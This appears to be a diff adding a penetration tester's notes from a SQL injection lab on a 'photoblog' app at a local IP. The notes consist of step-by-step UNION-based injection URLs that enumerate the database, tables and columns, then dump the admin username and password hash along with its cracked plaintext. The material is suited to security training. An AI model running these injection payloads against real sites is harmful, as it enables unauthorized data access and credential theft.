@@ -1,0 +1,34 @@
+version:  5.1.63-0+squeeze1
+database:photoblog
+user: pentesterlab@localhost
+datadir: /var/lib/mysql/
+---------------------------------
+http://192.168.1.142/cat.php?id=2 union select 1,2,3,4 --+
+http://192.168.1.142/cat.php?id=2 union select 1,version(),3,4 --+
+http://192.168.1.142/cat.php?id=2 union select 1,database(),3,4 --+
+http://192.168.1.142/cat.php?id=2 union select 1,user(),3,4 --+
+
+---------------------------------
+
+Union select 1,group_concat(schema_name),3,4 from information_schema.schemata
+http://192.168.1.142/cat.php?id=2 Union select 1,group_concat(schema_name),3,4 from information_schema.schemata
+databases: information_schema,photoblog
+database name: photoblog
+
+----------------------------------
+Union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
+tables: categories,pictures,users
+
+------------------------------------
+Union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x7573657273
+
+columns for users: id,login,password
+
+-------------------------------------
+http://192.168.1.142/cat.php?id=2 Union select 1,group_concat(id,0x3a3a,login,0x3a3a,password),3,4 from users
+1::admin::8efe310f9ab3efeae8d410a8e0166eb2
+id=1
+login: admin
+password: 8efe310f9ab3efeae8d410a8e0166eb2----> P4ssw0rd
+
+admin@P4ssw0rd
